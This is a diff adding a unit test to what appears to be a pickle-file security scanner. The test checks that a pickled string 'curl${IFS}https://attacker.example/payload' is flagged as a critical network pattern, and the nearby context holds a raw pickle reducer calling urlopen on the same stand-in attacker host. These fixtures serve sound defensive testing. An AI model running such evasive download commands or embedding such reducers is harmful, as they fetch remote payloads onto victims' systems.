@@ -1954,6 +1954,20 @@ def test_scan_stream_keeps_spaced_network_attribute_url_actionable() -> None:
     )
 
 
+def test_scan_stream_keeps_shell_ifs_network_url_actionable() -> None:
+    payload = pickle.dumps({"loader": "curl${IFS}https://attacker.example/payload"}, protocol=0)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="shell-ifs-network-code.pkl")
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
 def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
     payload = b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR."
 
